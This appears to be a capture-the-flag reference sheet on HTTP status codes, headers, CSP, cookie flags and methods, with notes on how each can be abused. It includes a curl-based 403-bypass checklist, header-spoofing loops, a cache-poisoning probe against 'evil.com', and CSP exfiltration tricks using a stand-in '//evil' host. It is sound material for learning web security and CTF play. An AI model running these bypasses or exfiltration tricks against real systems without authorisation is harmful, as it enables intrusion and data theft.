---
title: "Reference - HTTP Status Codes and Headers, CTF Relevance"
category: web
subcategory: http
type: reference
tags: [http, status-codes, headers, security-headers, csp, cors, cookies, samesite, cache-control, x-forwarded-for, hop-by-hop, content-type, burpsuite, ffuf, web-recon, what-does-this-mean]
summary: "Every status code and security header that matters in a CTF, what it implies about the backend, and how to abuse or bypass it."
related: [web-triage, ffuf, burpsuite, attack-surface-by-primitive]
---

## 1. Status codes and what they tell you

| Code | Name | CTF meaning / next step |
|---|---|---|
| 100 | Continue | you sent `Expect: 100-continue`; used in smuggling probes |
| 101 | Switching Protocols | WebSocket upgrade accepted -> `ctfbrain search hunt-websocket` |
| 200 | OK | success. **Check the body length** - a 200 with a different size is the signal in brute forcing |
| 201 | Created | your POST created something; note the `Location` header for the new id (IDOR) |
| 204 | No Content | action succeeded silently; useful as an oracle (compare with 400) |
| 206 | Partial Content | `Range` supported -> byte-range requests; range-based cache poisoning |
| 301 | Moved Permanently | follow it (`curl -L`); often HTTP->HTTPS or a canonical host. Aggressively cached |
| 302 | Found | the classic redirect. **Read the body** - many apps leak the protected content in the body of a 302 |
| 303 | See Other | POST->GET redirect |
| 304 | Not Modified | conditional request; the client cache has it. Remove `If-None-Match`/`If-Modified-Since` |
| 307 | Temporary Redirect | preserves the method and body - important for SSRF chains and CSRF |
| 308 | Permanent Redirect | same, permanent |
| 400 | Bad Request | malformed. In smuggling probes a 400 means the parser disagreed |
| 401 | Unauthorized | auth required; check `WWW-Authenticate` for the scheme (Basic/Digest/NTLM/Bearer) |
| 402 | Payment Required | rare; sometimes a custom "not enough credits" |
| 403 | Forbidden | **the most interesting code in a CTF.** The resource exists. Try the bypasses in section 4 |
| 404 | Not Found | may be a lie: compare body length against a known-bad path |
| 405 | Method Not Allowed | the path exists! Try every method: `OPTIONS`, `PUT`, `DELETE`, `PATCH`, `TRACE` |
| 406 | Not Acceptable | change `Accept:`; sometimes a WAF signature hit |
| 408 | Request Timeout | used to detect request smuggling (a hung socket) |
| 409 | Conflict | a state machine exists; race conditions live here |
| 411 | Length Required | send `Content-Length` |
| 413 | Payload Too Large | a size limit; relevant for zip bombs and DoS |
| 414 | URI Too Long | the limit is usually 8KB (nginx) or 4KB - relevant for cache poisoning |
| 415 | Unsupported Media Type | change `Content-Type` - `application/json` vs `text/plain` vs `multipart/form-data` matters for CSRF and parsing bugs |
| 418 | I'm a teapot | a joke, but CTF authors use it as a hint marker |
| 422 | Unprocessable Entity | validation failed; the error body usually names the expected fields (mass assignment) |
| 429 | Too Many Requests | rate limited; rotate `X-Forwarded-For`, slow down, or race in parallel |
| 431 | Request Header Fields Too Large | header size limit |
| 451 | Unavailable For Legal Reasons | flavour |
| 500 | Internal Server Error | **you broke something - that is progress.** Read the body for a stack trace; the input that caused it is your injection point |
| 501 | Not Implemented | the method is unknown to the server |
| 502 | Bad Gateway | the upstream died. In SSRF, a 502 vs a timeout distinguishes open from closed ports |
| 503 | Service Unavailable | overloaded or deliberately down |
| 504 | Gateway Timeout | the upstream hung. Time-based blind injection signal |
| 505 | HTTP Version Not Supported | try `HTTP/0.9`, `HTTP/1.0`, `HTTP/2` for parser differentials |

### Using status codes as an oracle
```sh
# ffuf: show everything, filter by size rather than code, so you see 403/500 too
ffuf -u https://t/FUZZ -w list.txt -mc all -fs 1234
# curl: print code and size only
curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' https://t/path
```

---

## 2. Request headers worth sending

| Header | Why |
|---|---|
| `Host:` | virtual hosting, routing-based SSRF, password-reset poisoning, cache poisoning |
| `X-Forwarded-For: 127.0.0.1` | IP-based allowlists and rate limits |
| `X-Forwarded-Host:` | unkeyed cache poisoning, absolute-URL generation |
| `X-Real-IP:`, `X-Client-IP:`, `Client-IP:`, `True-Client-IP:`, `CF-Connecting-IP:` | same as XFF, different proxies |
| `X-Original-URL:`, `X-Rewrite-URL:` | path override on some stacks -> 403 bypass |
| `X-HTTP-Method-Override: PUT` | verb tampering through a proxy that only allows GET/POST |
| `X-Forwarded-Proto: https` | bypass an HTTPS-only redirect loop |
| `Referer:` | some checks trust it; also leaks tokens outward |
| `Origin:` | triggers CORS logic; test reflection |
| `Cookie:` | obviously; also try removing it entirely |
| `Authorization: Bearer <jwt>` | try `alg:none`, expired tokens, another user's |
| `Content-Type:` | `application/json` vs `application/x-www-form-urlencoded` vs `text/plain` changes the parser (and CSRF-ability) |
| `Transfer-Encoding: chunked` | smuggling |
| `Connection: keep-alive, X-Foo` | hop-by-hop header abuse: strips `X-Foo` at the proxy |
| `Range: bytes=0-0` | partial responses, cache poisoning |
| `Accept-Encoding:` | remove it to get plaintext responses; `gzip` bombs |
| `Accept: application/json` | may switch the app into an API mode with more data |
| `User-Agent:` | log poisoning for LFI-to-RCE; also WAF fingerprinting |
| `Expect: 100-continue` | smuggling probes |
| `If-None-Match: <etag>` | cache behaviour; ETag can leak inode numbers |
| `Max-Forwards: 0` | reveals proxy hops with TRACE |

---

## 3. Response headers and their implications

| Header | What it tells you / how to abuse |
|---|---|
| `Server:` | the exact web server and version -> known CVEs |
| `X-Powered-By:` | the language/framework -> `ctfbrain search web-triage` fingerprint table |
| `X-AspNet-Version:`, `X-Runtime:`, `X-Generator:` | more fingerprinting |
| `Set-Cookie:` | look for `HttpOnly` (blocks JS theft), `Secure`, `SameSite`, `Path`, `Domain` |
| `Set-Cookie` without `HttpOnly` | XSS can steal it directly |
| `SameSite=None` | CSRF is fully possible cross-site |
| `SameSite=Lax` | CSRF still works for top-level GET navigations, and from sibling subdomains |
| `SameSite=Strict` | CSRF blocked cross-site; a subdomain XSS still works |
| `Domain=.example.com` | any subdomain can read/set it -> subdomain takeover becomes session theft |
| `Content-Security-Policy:` | see section 5 |
| `X-Frame-Options: DENY` | no clickjacking |
| `X-Content-Type-Options: nosniff` | blocks MIME confusion XSS on uploads |
| `Strict-Transport-Security:` | forces HTTPS; blocks some MITM chains |
| `Referrer-Policy:` | if `unsafe-url`, tokens in URLs leak to third parties |
| `Access-Control-Allow-Origin:` | if it reflects your `Origin` **and** `Allow-Credentials: true`, that is a CORS read -> `ctfbrain search hunt-cors` |
| `Access-Control-Allow-Origin: *` | no credentials allowed; usually not exploitable alone |
| `Cache-Control: public` on a private page | cache deception / poisoning |
| `Age:`, `X-Cache: HIT/MISS`, `CF-Cache-Status:` | a cache exists -> poisoning and deception are on the table |
| `Vary:` | tells you which headers are keyed; anything **not** in `Vary` is unkeyed and poisonable |
| `Content-Type: text/html` on a user-uploaded file | stored XSS |
| `Content-Disposition: attachment` | forces download; removing it enables XSS |
| `Location:` | the redirect target; check for open redirect and for a leaked token |
| `WWW-Authenticate:` | the auth scheme; `Basic realm=` sometimes names the app |
| `ETag:` | can encode inode/size/mtime -> information disclosure |
| `X-Debug`, `X-Request-Id`, `X-Trace` | debugging surface; correlate errors |
| No `Content-Length`, `Transfer-Encoding: chunked` | smuggling relevance |
| `X-Permitted-Cross-Domain-Policies` | Flash-era, still seen |
| `Clear-Site-Data` | wipes storage; rare |
| `Permissions-Policy` / `Feature-Policy` | restricts browser APIs |
| `Report-To` / `NEL` | out-of-band reporting; can leak request data |

---

## 4. The 403 bypass checklist

A 403 means the resource exists. Work through this list.

```sh
U=https://target.ctf/admin
# path mangling
curl -sik "$U/"          ; curl -sik "$U/."          ; curl -sik "$U//"
curl -sik "$U/./"        ; curl -sik "$U/.."         ; curl -sik "${U}%20"
curl -sik "${U}%09"      ; curl -sik "${U}?"         ; curl -sik "${U}#"
curl -sik "${U}.json"    ; curl -sik "${U}.html"     ; curl -sik "${U};/"
curl -sik "${U}/*"       ; curl -sik "${U}%2f"       ; curl -sik "${U}..;/"
# case
curl -sik "https://target.ctf/ADMIN" ; curl -sik "https://target.ctf/Admin"
# path override headers
for h in X-Original-URL X-Rewrite-URL X-Override-URL; do
  curl -sik -H "$h: /admin" https://target.ctf/
done
# IP spoofing headers
for h in X-Forwarded-For X-Real-IP X-Client-IP True-Client-IP CF-Connecting-IP X-Originating-IP; do
  curl -sik -H "$h: 127.0.0.1" "$U"
done
# method change
for m in POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT FOO; do
  printf '%-8s %s\n' "$m" "$(curl -s -o /dev/null -w '%{http_code}' -X "$m" "$U")"
done
# protocol version
curl -sik --http1.0 "$U"; curl -sik --http2 "$U"
# trailing-dot host / alternate vhost
curl -sik -H 'Host: target.ctf.' "$U"
```
`ffuf` has a bypass wordlist at `/usr/share/seclists/Discovery/Web-Content/`.

---

## 5. CSP quick reference

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com
```

| Directive value | Consequence |
|---|---|
| `'unsafe-inline'` in `script-src` | inline `<script>` and event handlers work -> XSS is unblocked |
| `'unsafe-eval'` | `eval`, `Function`, `setTimeout("...")` work |
| A CDN in `script-src` (`*.googleapis.com`, `unpkg.com`, `cdnjs`) | JSONP endpoints or an AngularJS/Vue copy on that CDN = bypass |
| `script-src 'self'` + a file upload or an open redirect on the same origin | upload/redirect to your JS |
| `'nonce-xxx'` | you must inject inside a tag that already has the nonce, or use dangling-markup |
| `'strict-dynamic'` | a trusted script can load anything; find a script gadget |
| `object-src` missing | `<object data="data:text/html,...">` may execute |
| `base-uri` missing | `<base href="//evil">` hijacks all relative script URLs |
| `form-action` missing | you can exfiltrate via a form POST even with a tight `connect-src` |
| No `frame-ancestors` | clickjacking possible |
| `default-src` only, no `script-src` | `default-src` applies to scripts too |
| `report-uri` present | an exfiltration channel for CSP-blocked data (very limited) |

Exfiltration when `connect-src` is tight: `<img src=//evil/?x=>` (needs `img-src`), DNS prefetch, `window.location`, a form submission, or CSS-based leaks. `ctfbrain search hunt-dom`

---

## 6. Cookie flags

| Flag | Meaning | Attack implication |
|---|---|---|
| `HttpOnly` | JS cannot read it | XSS cannot steal it directly - perform actions in-browser instead |
| `Secure` | HTTPS only | no plaintext theft |
| `SameSite=Strict` | never sent cross-site | CSRF blocked; same-site XSS still works |
| `SameSite=Lax` (the browser default) | sent on top-level GET navigations | CSRF via GET or a `<form method=GET>` still possible; sibling subdomains count as same-site |
| `SameSite=None` | always sent | full CSRF |
| `Domain=.example.com` | shared with all subdomains | subdomain takeover -> session theft; also cookie-tossing |
| `Path=/admin` | only sent under that path | scoping, sometimes bypassable with `/admin/../` |
| `__Host-` prefix | must be Secure, no Domain, Path=/ | resists cookie tossing |
| `__Secure-` prefix | must be Secure | weaker than `__Host-` |
| No expiry (session cookie) | dies with the browser | - |
| `Max-Age=0` | deletion | |

---

## 7. Methods

| Method | Use in CTF |
|---|---|
| `GET` | the default |
| `POST` | state change; CSRF target |
| `PUT` | may upload a file directly (WebDAV / misconfigured server) -> webshell |
| `DELETE` | destructive IDOR |
| `PATCH` | partial update -> mass assignment |
| `OPTIONS` | lists allowed methods via `Allow:`; also CORS preflight |
| `HEAD` | same as GET without a body; some auth filters miss it |
| `TRACE` | echoes the request; Cross-Site Tracing, and reveals proxy header rewriting |
| `CONNECT` | proxy tunnelling |
| An invalid method (`FOO`) | some frameworks treat unknown methods as GET, bypassing method-based ACLs |

```sh
curl -sik -X OPTIONS https://target/ -i | grep -i '^allow'
```

---

## 8. Header-based recon one-liners

```sh
# full headers plus timing
curl -sSik -w '\n--- %{http_code} %{size_download}B %{time_total}s\n' https://target/

# just the security headers, present or absent
curl -sSI https://target/ | grep -iE 'content-security|x-frame|x-content-type|strict-transport|referrer-policy|permissions-policy|access-control|set-cookie'

# what is unkeyed by the cache? add a junk header and see if it reflects and caches
curl -sSik -H 'X-Forwarded-Host: evil.com' 'https://target/?cb=1' | grep -i evil

# TRACE to see what the proxy adds
printf 'TRACE / HTTP/1.1\r\nHost: target\r\nX-Probe: 1\r\n\r\n' | openssl s_client -quiet -connect target:443
```
